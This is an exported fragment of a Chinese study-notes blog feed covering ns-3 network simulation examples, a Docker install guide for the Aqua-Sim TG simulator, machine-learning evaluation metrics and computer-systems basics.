时打开</span></span><br><span class="line">  serverApps.<span class="built_in">Stop</span> (<span class="built_in">Seconds</span> (<span class="number">10.0</span>)); <span class="comment">//在 10s 时关闭</span></span><br><span class="line"></span><br><span class="line">  <span class="function">UdpEchoClientHelper <span class="title">echoClient</span> <span class="params">(interfaces.GetAddress (<span class="number">1</span>), <span class="number">9</span>)</span></span>; <span class="comment">//udp 客户端访问 node1 的 ip，端口为 9</span></span><br><span class="line">  echoClient.<span class="built_in">SetAttribute</span> (<span class="string">&quot;MaxPackets&quot;</span>, <span class="built_in">UintegerValue</span> (<span class="number">1</span>)); <span class="comment">//运行传输的最大包数为 1</span></span><br><span class="line">  echoClient.<span class="built_in">SetAttribute</span> (<span class="string">&quot;Interval&quot;</span>, <span class="built_in">TimeValue</span> (<span class="built_in">Seconds</span> (<span class="number">1.0</span>))); <span class="comment">// 间隔 1s</span></span><br><span class="line">  echoClient.<span class="built_in">SetAttribute</span> (<span class="string">&quot;PacketSize&quot;</span>, <span class="built_in">UintegerValue</span> (<span class="number">1024</span>)); <span class="comment">//每个包 1024 字节</span></span><br><span class="line"></span><br><span class="line">  ApplicationContainer clientApps = echoClient.<span class="built_in">Install</span> (nodes.<span class="built_in">Get</span> (<span class="number">0</span>)); <span class="comment">//在 node0 上安装 udp 客户端应用程序</span></span><br><span class="line">  clientApps.<span class="built_in">Start</span> (<span class="built_in">Seconds</span> (<span class="number">2.0</span>)); <span class="comment">//udp 客户端在 2s 时打开</span></span><br><span class="line">  clientApps.<span class="built_in">Stop</span> (<span class="built_in">Seconds</span> (<span class="number">10.0</span>)); <span class="comment">//在 10s 时关闭</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//以下是固定模式</span></span><br><span class="line">  Simulator::<span class="built_in">Run</span> (); <span class="comment">//模拟器开始运行</span></span><br><span class="line">  Simulator::<span class="built_in">Destroy</span> (); <span class="comment">//摧毁模拟器</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>运行结果：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://image.txgde.space/2023/10/27/653b7d8073731.webp"
                     
                ><br>udp 客户端在2s 启动时向 udp 服务器发送了一个 1024 字节的数据包</p>
<p>尝试更改：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">echoClient.<span class="built_in">SetAttribute</span> (<span class="string">&quot;MaxPackets&quot;</span>, <span class="built_in">UintegerValue</span> (<span class="number">5</span>)); <span class="comment">//运行传输的最大包数为 5</span></span><br><span class="line">echoClient.<span class="built_in">SetAttribute</span> (<span class="string">&quot;Interval&quot;</span>, <span class="built_in">TimeValue</span> (<span class="built_in">Seconds</span> (<span class="number">1.0</span>))); <span class="comment">// 间隔 1s</span></span><br><span class="line">echoClient.<span class="built_in">SetAttribute</span> (<span class="string">&quot;PacketSize&quot;</span>, <span class="built_in">UintegerValue</span> (<span class="number">1024</span>)); <span class="comment">//每个包 1024 字节</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p> 运行结果：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://image.txgde.space/2023/10/27/653b7e53f295e.webp"
                     
                ><br> udp 客户端在2s 启动时开始向 udp 服务器发送 1024 字节的数据包，每隔 1s 发送一个</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>研究生</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>ns-3</tag>
        <tag>网络模拟器</tag>
      </tags>
  </entry>
  <entry>
    <title>【学习笔记】ns3 核心概念的理解</title>
    <url>/2023/10/19/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91ns3%20%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<p><strong><a class="link"   href="https://www.nsnam.org/docs" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
<h2 id="各网络组件对现实生活网络的抽象"><a href="#各网络组件对现实生活网络的抽象" class="headerlink" title="各网络组件对现实生活网络的抽象"></a>各网络组件对现实生活网络的抽象</h2><ul>
<li>Node(组件)<br>  可以抽象为现实生活中的一个网络终端<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://image.txgde.space/2023/10/27/653b1d19effee.webp"
                     
                ></li>
<li>Net Device(网络设备)<br>  可以抽象为终端中的网络硬件，如网卡<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://image.txgde.space/2023/10/27/653b1d3e0521a.webp"
                     
                ></li>
<li>Application(应用)<br>  可以抽象为终端中的应用程序</li>
<li>Channel(信道)<br>  可以抽象为网线、 wifi 等连接各终端的设备<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://image.txgde.space/2023/10/27/653b1cec127dd.webp"
                     
                ></li>
<li>Helper(拓扑辅助程序)<br>  通过各种组件的 Helper 类可以批量地创建大量组件，如 Node 、 Net Device 等</li>
</ul>
<h2 id="各网络组件之间的关系"><a href="#各网络组件之间的关系" class="headerlink" title="各网络组件之间的关系"></a>各网络组件之间的关系</h2><h3 id="网络组件创建"><a href="#网络组件创建" class="headerlink" title="网络组件创建"></a>网络组件创建</h3><p>先创建一个 Node，再在各 Node 中创建 Net Device 和 Application，最后再创建 Channel 供 Net Device 直接互相传输信息。</p>
<h3 id="网络组件调用关系"><a href="#网络组件调用关系" class="headerlink" title="网络组件调用关系"></a>网络组件调用关系</h3><p>Node终端中的 Application 调用该 Node 中的 Net Device 通过 Channel 与另外一个 Node 的 Net Device 进行连接，并将信息传输到另外一个 Node 中供另外一个 Node 的 Application 进行分析使用，关系图如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://image.txgde.space/2023/10/27/653b168b5aa4b.webp"
                     
                ></p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>研究生</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>ns-3</tag>
        <tag>网络模拟器</tag>
      </tags>
  </entry>
  <entry>
    <title>【学习笔记】ns3(吉大Aquasim-Third Generation)Docker纯净安装</title>
    <url>/2023/10/15/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91ns3(%E5%90%89%E5%A4%A7Aquasim-Third%20Generation)%E4%BD%BF%E7%94%A8Docker%E7%BA%AF%E5%87%80%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="1-、拉取-Docker-镜像"><a href="#1-、拉取-Docker-镜像" class="headerlink" title="1 、拉取 Docker 镜像"></a>1 、拉取 Docker 镜像</h2><p>推荐使用 Ubuntu:18.04 的镜像</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it -p &lt;host_data&gt;:&lt;/home&gt; --name ns3 ubuntu:18.04</span><br></pre></td></tr></table></figure></div>
<h2 id="2、下载必要软件包"><a href="#2、下载必要软件包" class="headerlink" title="2、下载必要软件包"></a>2、下载必要软件包</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install vim</span><br></pre></td></tr></table></figure></div>
<h2 id="3、更换apt国内源-可选"><a href="#3、更换apt国内源-可选" class="headerlink" title="3、更换apt国内源(可选)"></a>3、更换apt国内源(可选)</h2><p>编辑 <code>/etc/apt/sources.list</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure></div>
<p>Command模式下输入<code>:%s/archive.ubuntu.com/mirrors.ustc.edu.cn</code>，将官方源换为中科大源<br><code>:wq</code>保存退出，输入<code>apt update</code>更新一下源</p>
<h2 id="4-、下载吉大的开源仿真系统"><a href="#4-、下载吉大的开源仿真系统" class="headerlink" title="4 、下载吉大的开源仿真系统"></a>4 、下载吉大的开源仿真系统</h2><p><strong><a class="link"   href="http://smartocean.jlu.edu.cn/info/1023/1096.htm" >官网:http://smartocean.jlu.edu.cn/info/1023/1096.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://image.txgde.space/2023/10/26/6539c10f772e7.webp"
                     
                ><br>将其移动到<host_data>目录下在 host 主机解压或在 docker 中解压，如下：<br>[可选]</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt install zip</span><br><span class="line">unzip ns3.zip</span><br></pre></td></tr></table></figure></div>
<p>[可选]</p>
<h2 id="安装-ns3-依赖库"><a href="#安装-ns3-依赖库" class="headerlink" title="安装 ns3 依赖库"></a>安装 ns3 依赖库</h2><p>新建一个sh 脚本如<code>ns3_install.sh</code>(命令:<code>vim ns3_install.sh</code>)内容如下:</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">apt-get install gcc g++ python python3 -y</span><br><span class="line">apt-get install gcc g++ python python3 python3-dev -y</span><br><span class="line">apt-get install python3-setuptools git mercurial -y</span><br><span class="line">apt-get install qt5-default mercurial -y</span><br><span class="line">apt-get install gir1.2-goocanvas-2.0 python-gi python-gi-cairo python-pygraphviz python3-gi python3-gi-cairo python3-pygraphviz gir1.2-gtk-3.0 ipython ipython3 -y</span><br><span class="line">apt-get install openmpi-bin openmpi-common openmpi-doc libopenmpi-dev -y</span><br><span class="line">apt-get install autoconf cvs bzr unrar -y</span><br><span class="line">apt-get install gdb valgrind -y</span><br><span class="line">apt-get install uncrustify -y</span><br><span class="line">apt-get install doxygen graphviz imagemagick -y</span><br><span class="line">apt-get install texlive texlive-extra-utils texlive-latex-extra texlive-font-utils texlive-lang-portuguese dvipng latexmk -y</span><br><span class="line">apt-get install python3-sphinx dia -y</span><br><span class="line">apt-get install gsl-bin libgsl-dev libgsl23 libgslcblas0 -y</span><br><span class="line">apt-get install tcpdump -y</span><br><span class="line">apt-get install sqlite sqlite3 libsqlite3-dev -y</span><br><span class="line">apt-get install libxml2 libxml2-dev -y</span><br><span class="line">apt-get install cmake libc6-dev libc6-dev-i386 libclang-dev llvm-dev automake -y</span><br><span class="line">apt-get install python-pip -y</span><br><span class="line">pip install cxxfilt -y</span><br><span class="line">apt-get install libgtk2.0-0 libgtk2.0-dev -y</span><br><span class="line">apt-get install vtun lxc -y</span><br><span class="line">apt-get install libboost-signals-dev libboost-filesystem-dev -y</span><br><span class="line">apt-get install python-dev python-pygraphviz python-kiwi python-pygoocanvas python-gnome2 gir1.2-goocanvas-2.0 python-rsvg -y</span><br></pre></td></tr></table></figure></div>
<p><code>:wq</code>保存之后给予运行权限<code>chmod +x ns3_install.sh</code><br>运行：<code>./ns3_install.sh</code><br>等待安装完即可(可能会出现两个包因为 ubuntu 版本问题装不了，暂时没发现影响，待后续观察)</p>
<h2 id="配置-并编译ns3"><a href="#配置-并编译ns3" class="headerlink" title="配置 并编译ns3"></a>配置 并编译ns3</h2><p>进入 ns3 目录，输入</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./waf --enable-examples --enable-tests configure</span><br></pre></td></tr></table></figure></div>
<p>等待配置结束<br>然后输入<code>./waf</code>来编译插件<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://image.txgde.space/2023/10/26/6539c7fe48407.webp"
                     
                ><br>重点观察 aqua-sim-tg插件是否安装成功<br>然后输入下面代码来测试是否能够正常运行</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./waf --run test</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://image.txgde.space/2023/10/26/6539c8a13112d.webp"
                     
                ><br>出现以上内容则代表运行成功</p>
<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><h3 id="总体说明"><a href="#总体说明" class="headerlink" title="总体说明"></a>总体说明</h3><p>aqua-sim-tg默认使用静态路由协议，路由表为 ns3&#x2F;1.txt 文件，路由表项目格式为 (表项所属节 点地址 : 目的地址 : 下一跳地址)。例如表项 1:2:3表示节点1收到一个目的地址为2的包其下一 跳为节点3。</p>
<ul>
<li>具体协议文件位于 ns3&#x2F;src&#x2F;aqua-sim-tg&#x2F;model 目录下。</li>
<li>用户运行脚本位于 ns3&#x2F;scratch 目录下。</li>
</ul>
<h3 id="增加协议"><a href="#增加协议" class="headerlink" title="增加协议"></a>增加协议</h3><p>在 ns3&#x2F;src&#x2F;aqua-sim-tg&#x2F;model 目录下增加协议源文件，在 ns3&#x2F;src&#x2F;aqua-sim-tg&#x2F;wscript 文件中 写入新增协议文件名。</p>
<h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>编写脚本之后，在 ns3 目录下使用 .&#x2F;waf –run fileName 命令运行</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3>]]></content>
      <categories>
        <category>学习笔记</category>
        <category>研究生</category>
      </categories>
      <tags>
        <tag>吉林大学</tag>
        <tag>计算机网络</tag>
        <tag>Aquasim</tag>
        <tag>ns-3</tag>
        <tag>网络模拟器</tag>
      </tags>
  </entry>
  <entry>
    <title>【计网】ns3(吉大Aquasim-Third Generation)Docker纯净安装</title>
    <url>/2023/10/15/%E3%80%90%E8%AE%A1%E7%BD%91%E3%80%91ns3(%E5%90%89%E5%A4%A7Aquasim-Third%20Generation)Docker%E7%BA%AF%E5%87%80%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="1-、拉取-Docker-镜像"><a href="#1-、拉取-Docker-镜像" class="headerlink" title="1 、拉取 Docker 镜像"></a>1 、拉取 Docker 镜像</h2><p>推荐使用 Ubuntu:18.04 的镜像</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it -p &lt;host_data&gt;:&lt;/home&gt; --name ns3 ubuntu:18.04</span><br></pre></td></tr></table></figure></div>
<h2 id="2、下载必要软件包"><a href="#2、下载必要软件包" class="headerlink" title="2、下载必要软件包"></a>2、下载必要软件包</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install vim</span><br></pre></td></tr></table></figure></div>
<h2 id="3、更换apt国内源-可选"><a href="#3、更换apt国内源-可选" class="headerlink" title="3、更换apt国内源(可选)"></a>3、更换apt国内源(可选)</h2><p>编辑 <code>/etc/apt/sources.list</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure></div>
<p>Command模式下输入<code>%s/archive.ubuntu.com/mirrors.ustc.edu.cn</code>，将官方源换为中科大源<br><code>:wq</code>保存退出，输入<code>apt update</code>更新一下源</p>
<h2 id="4-、下载吉大的开源仿真系统"><a href="#4-、下载吉大的开源仿真系统" class="headerlink" title="4 、下载吉大的开源仿真系统"></a>4 、下载吉大的开源仿真系统</h2><p>**<a class="link"   href="http://smartocean.jlu.edu.cn/info/1023/1096.htm" >官网:http://smartocean.jlu.edu.cn/info/1023/1096.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>![[Pasted image 20231024115638.png]]</p>
]]></content>
      <categories>
        <category>计算机网络</category>
        <category>研究生</category>
      </categories>
      <tags>
        <tag>吉林大学</tag>
        <tag>计算机网络</tag>
        <tag>Aquasim</tag>
        <tag>ns-3</tag>
        <tag>网络模拟器</tag>
      </tags>
  </entry>
  <entry>
    <title>[学习笔记]机器学习相关概念</title>
    <url>/2022/02/01/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A001/</url>
    <content><![CDATA[<h2 id="一、欠拟合与过拟合"><a href="#一、欠拟合与过拟合" class="headerlink" title="一、欠拟合与过拟合"></a>一、欠拟合与过拟合</h2><h3 id="1、定义"><a href="#1、定义" class="headerlink" title="1、定义"></a>1、定义</h3><p>欠拟合：模型在训练集上误差很高</p>
<p>过拟合：在训练集上误差低，测试集上误差高</p>
<h3 id="2、原因"><a href="#2、原因" class="headerlink" title="2、原因"></a>2、原因</h3><p>欠拟合：模型过于简单，没有很好的捕捉到数据特征，不能很好的拟合数据</p>
<p>过拟合：模型把数据学习的太彻底，以至于把噪声数据的特征也学习到了，这样就会导致在后期测试的时候不能够很好地识别数据，模型泛化能力太差</p>
<h3 id="3、图例"><a href="#3、图例" class="headerlink" title="3、图例"></a>3、图例</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022202987.jpg"
                      alt="b2d095f0fc5eb1508012e00906987214"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022203809.jpg"
                      alt="167ed0eb8647448892364ecb31ecdac2"
                ></p>
<h2 id="二、偏差与方差"><a href="#二、偏差与方差" class="headerlink" title="二、偏差与方差"></a>二、偏差与方差</h2><h3 id="1、定义-1"><a href="#1、定义-1" class="headerlink" title="1、定义"></a>1、定义</h3><p>偏差：预计值的期望与真实值之间的差距</p>
<p>方差：预测值的离散程度，也就是离其期望值的距离</p>
<h3 id="2、图例"><a href="#2、图例" class="headerlink" title="2、图例"></a>2、图例</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022206209.jpg"
                      alt="9423562ff72e39a83b1102a5a009d374"
                ></p>
<p>上图表示，如果一个模型在训练集上正确率为 80%，测试集上正确率为 79% ，则模型欠拟合，其中 20% 的误差来自于偏差，1% 的误差来自于方差。如果一个模型在训练集上正确率为 99%，测试集上正确率为 80% ，则模型过拟合，其中 1% 的误差来自于偏差，19% 的误差来自于方差。可以看出，欠拟合是一种高偏差的情况。过拟合是一种低偏差，高方差的情况。</p>
<h2 id="三、衡量回归的性能指标"><a href="#三、衡量回归的性能指标" class="headerlink" title="三、衡量回归的性能指标"></a>三、衡量回归的性能指标</h2><h3 id="1、MSE-（Mean-Squared-Error）均方误差"><a href="#1、MSE-（Mean-Squared-Error）均方误差" class="headerlink" title="1、MSE （Mean Squared Error）均方误差"></a>1、MSE （Mean Squared Error）均方误差</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022209619.png"
                      alt="image-20220202220948853"
                ></p>
<p>其中y的i次方表示第 i 个样本的真实标签，p的i次方表表示模型对第 i 个样本的预测标签。线性回归的目的就是让损失函数最小。那么模型训练出来了，我们在测试集上用损失函数来评估模型就行了。</p>
<h3 id="2、RMSE（Root-Mean-Squard-Error）均方根误差"><a href="#2、RMSE（Root-Mean-Squard-Error）均方根误差" class="headerlink" title="2、RMSE（Root Mean Squard Error）均方根误差"></a>2、RMSE（Root Mean Squard Error）均方根误差</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022211113.png"
                      alt="image-20220202221123863"
                ></p>
<p>RMSE 其实就是 MSE 开个根号。有什么意义呢？其实实质是一样的。只不过用于数据更好的描述</p>
<h3 id="3、MAE-平均绝对误差"><a href="#3、MAE-平均绝对误差" class="headerlink" title="3、MAE (平均绝对误差)"></a>3、MAE (平均绝对误差)</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022212523.png"
                      alt="image-20220202221201902"
                ></p>
<p>MAE 虽然不作为损失函数，确是一个非常直观的评估指标，它表示每个样本的预测标签值与真实标签值的 L1 距离</p>
<h3 id="4、R-Squared"><a href="#4、R-Squared" class="headerlink" title="4、R-Squared"></a>4、R-Squared</h3><p>上面的几种衡量标准针对不同的模型会有不同的值。比如说预测房价 那么误差单位就是万元。数子可能是 3，4 ，5 之类的。那么预测身高就可能是 0.1，0.6 之类的。没有什么可读性，到底多少才算好呢？不知道，那要根据模型的应用场景来。 看看分类算法的衡量标准就是正确率，而正确率又在 0～1 之间，最高百分之百。最低 0 。如果是负数，则考虑非线性相关。很直观，而且不同模型一样的。那么线性回归有没有这样的衡量标准呢？ R-Squared 就是这么一个指标，公式如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022212889.png"
                      alt="image-20220202221254874"
                ></p>
<h2 id="四、混淆矩阵"><a href="#四、混淆矩阵" class="headerlink" title="四、混淆矩阵"></a>四、混淆矩阵</h2><p>以癌症检测系统为例，癌症检测系统的输出不是有癌症就是健康，这里为了方便，就用 1 表示患有癌症，0 表示健康。假设现在拿 10000 条数据来进行测试，其中有 9978 条数据的真实类别是 0，系统预测的类别也是 0，有 2 条数据的真实类别是 1 却预测成了 0，有 12 条数据的真实类别是 0 但预测成了 1，有 8 条数据的真实类别是 1，预测结果也是 1，如果我们把这些结果组成如下矩阵，则该矩阵就成为<strong>混淆矩阵</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022218334.png"
                      alt="image-20220202221856096"
                ></p>
<p>混淆矩阵中每个格子所代表的的意义也很明显，意义如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022219812.png"
                      alt="image-20220202221927858"
                ></p>
<p>如果将正确看成是 True，错误看成是 False， 0 看成是 Negtive， 1 看成是 Positive。然后将上表中的文字替换掉，混淆矩阵如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022219579.png"
                      alt="image-20220202221943918"
                ></p>
<h2 id="五、精准率与召回率"><a href="#五、精准率与召回率" class="headerlink" title="五、精准率与召回率"></a>五、精准率与召回率</h2><h3 id="1、精准率"><a href="#1、精准率" class="headerlink" title="1、精准率"></a>1、精准率</h3><p>**精准率(Precision)**指的是模型预测为 Positive 时的预测准确度，其计算公式如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022217729.png"
                      alt="image-20220202221622945"
                ></p>
<h3 id="2、召回率"><a href="#2、召回率" class="headerlink" title="2、召回率"></a>2、召回率</h3><p>**召回率(Recall)**指的是我们关注的事件发生了，并且模型预测正确了的比值，其计算公式如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022217885.png"
                      alt="image-20220202221714087"
                ></p>
<h2 id="六、F1-Score"><a href="#六、F1-Score" class="headerlink" title="六、F1 Score"></a>六、F1 Score</h2><p>如果想要同时兼顾<strong>精准率</strong>和<strong>召回率</strong>，这个时候就可以使用 <strong>F1 Score</strong> 来作为性能度量指标。<strong>F1 Score</strong> 是统计学中用来衡量二分类模型精确度的一种指标。它同时兼顾了分类模型的准确率和召回率。 F1 Score 可以看作是模型准确率和召回率的一种加权平均，它的最大值是 1，最小值是 0。其公式如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/202202022221992.png"
                      alt="image-20220202222109237"
                ></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>F1Score</tag>
        <tag>MAE</tag>
        <tag>MSE</tag>
        <tag>RMSE</tag>
        <tag>偏差</tag>
        <tag>召回率</tag>
        <tag>学习笔记</tag>
        <tag>方差</tag>
        <tag>机器学习</tag>
        <tag>欠拟合</tag>
        <tag>混淆矩阵</tag>
        <tag>精准率</tag>
        <tag>过拟合</tag>
      </tags>
  </entry>
  <entry>
    <title>[学习笔记]计算机系统学习笔记Week1-1</title>
    <url>/2022/07/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0week1-1/</url>
    <content><![CDATA[<h2 id="冯·诺依曼系统结构"><a href="#冯·诺依曼系统结构" class="headerlink" title="冯·诺依曼系统结构"></a>冯·诺依曼系统结构</h2><h3 id="主要思想："><a href="#主要思想：" class="headerlink" title="主要思想："></a>主要思想：</h3><p>1、计算机应由<strong>运算器、控制器、存储器、输入设备和输出设备</strong>五个基本部件组成。<br>2、各基本部件的功能是：<br>•<strong>存储器</strong>不仅能存放数据，而且也能存放指令，形式上两者没有区别，但计算机应能区分数据还是指令；<br>•<strong>控制器</strong>应能自动取出指令来执行；<br>•<strong>运算器</strong>应能进行加&#x2F;减&#x2F;乘&#x2F;除四种基本算术运算，并且也能进行一些逻辑运算和附加运算；<br>•操作人员可以通过<strong>输入设备</strong>、<strong>输出设备</strong>和主机进行通信。<br>3、内部以<strong>二进制</strong>表示指令和数据。每条指令由操作码和地址码两部分组成。操作码指出操作类型 ，地址码指出操作数的地址。由一串指令组成程序。<br>4、采用<strong>“存储程序”</strong> 工作方式。</p>
<h2 id="现代操作系统工作流程"><a href="#现代操作系统工作流程" class="headerlink" title="现代操作系统工作流程"></a>现代操作系统工作流程</h2><h3 id="程序执行前"><a href="#程序执行前" class="headerlink" title="程序执行前"></a>程序执行前</h3><p>数据和指令事先存放在存储器中，每条指令和每个数据都有地址，指令按序存放，指令由OP、ADDR字段组成，程序起始地址置PC</p>
<h3 id="开始执行程序"><a href="#开始执行程序" class="headerlink" title="开始执行程序"></a>开始执行程序</h3><p>第一步：根据PC取指令</p>
<p>第二步：指令译码</p>
<p>第三步：取操作数</p>
<p>第四步：指令执行</p>
<p>第五步：回写结果</p>
<p>第六步：修改PC的值</p>
<p>继续执行下一条指令</p>
<h2 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h2><h3 id="汇编语言由汇编指令组成"><a href="#汇编语言由汇编指令组成" class="headerlink" title="汇编语言由汇编指令组成"></a>汇编语言由汇编指令组成</h3><h3 id="什么是汇编指令"><a href="#什么是汇编指令" class="headerlink" title="什么是汇编指令"></a>什么是汇编指令</h3><p>用助记符和标号来表示的指令叫做汇编指令，与机器指令是一一对应的</p>
<h3 id="什么是指令"><a href="#什么是指令" class="headerlink" title="什么是指令"></a>什么是指令</h3><p>·指令包含操作码和操作数或其地址码</p>
<p>·指令只能描述：取&#x2F;存一个数</p>
<p>​ 两个数进行加&#x2F;减&#x2F;乘&#x2F;除&#x2F;与&#x2F;或运算</p>
<p>​ 根据运算结果判断是否转移执行</p>
<h3 id="机器语言和汇编语言都是面向机器结构的语言，故它们统称为机器级语言"><a href="#机器语言和汇编语言都是面向机器结构的语言，故它们统称为机器级语言" class="headerlink" title="机器语言和汇编语言都是面向机器结构的语言，故它们统称为机器级语言"></a>机器语言和汇编语言都是面向机器结构的语言，故它们统称为机器级语言</h3><h2 id="高级语言"><a href="#高级语言" class="headerlink" title="高级语言"></a>高级语言</h2><h3 id="高级语言的特点"><a href="#高级语言的特点" class="headerlink" title="高级语言的特点"></a>高级语言的特点</h3><p>·与具体机器结构无关</p>
<p>·面向算法描述，比机器级语言描述能力强得多</p>
<p>·高级语言中一条语句对应几条、几十条甚至几百条指令</p>
<p>·有“面向过程”和“面向对象“的语言之分</p>
<p>·处理逻辑分为顺序结构、选择结构、循环结构</p>
<p>·有”编译”和”解释“两种转换方式：</p>
<p>​ 编译程序：将高级语言源程序转换为机器级目标程序，执行时只要启动目标程序即可</p>
<p>​ 解释程序：将高级语言语句逐条翻译成机器指令并立即执行，不生成目标文件</p>
<h2 id="不同层次语言直接的等价转换"><a href="#不同层次语言直接的等价转换" class="headerlink" title="不同层次语言直接的等价转换"></a>不同层次语言直接的等价转换</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blogcdn.txgde.space/blogimg/202207101800075.png"
                      alt="image-20220710180002023"
                ></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>学习笔记</tag>
        <tag>冯诺依曼</tag>
        <tag>计算机系统</tag>
        <tag>高级语言</tag>
      </tags>
  </entry>
  <entry>
    <title>[学习笔记]计算机系统学习笔记Week1-2</title>
    <url>/2022/07/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0week1-2/</url>
    <content><![CDATA[<h2 id="信息的编码"><a href="#信息的编码" class="headerlink" title="信息的编码"></a>信息的编码</h2><h3 id="机器级数据分为"><a href="#机器级数据分为" class="headerlink" title="机器级数据分为"></a>机器级数据分为</h3><p>​ 数值数据：无符号整数、带符号整数、浮点数</p>
<p>​ 非数值数据：逻辑数、西文字符和汉字</p>
<h3 id="所有的信息都是使用二进制进行编码的"><a href="#所有的信息都是使用二进制进行编码的" class="headerlink" title="所有的信息都是使用二进制进行编码的"></a>所有的信息都是使用二进制进行编码的</h3><p> <strong>真值和机器数(重要!!!):</strong><br>​ <strong>机器数</strong>:用0和1编码的计算机内部的0&#x2F;1序列<br>​ <strong>真值</strong>：真正的值，即：现实中带正负号的数</p>
<h3 id="数值数据表示的三要素"><a href="#数值数据表示的三要素" class="headerlink" title="数值数据表示的三要素"></a>数值数据表示的三要素</h3><ul>
<li>进位计数制</li>
<li>定、浮点数表示</li>
<li>如何用二进制编码</li>
</ul>
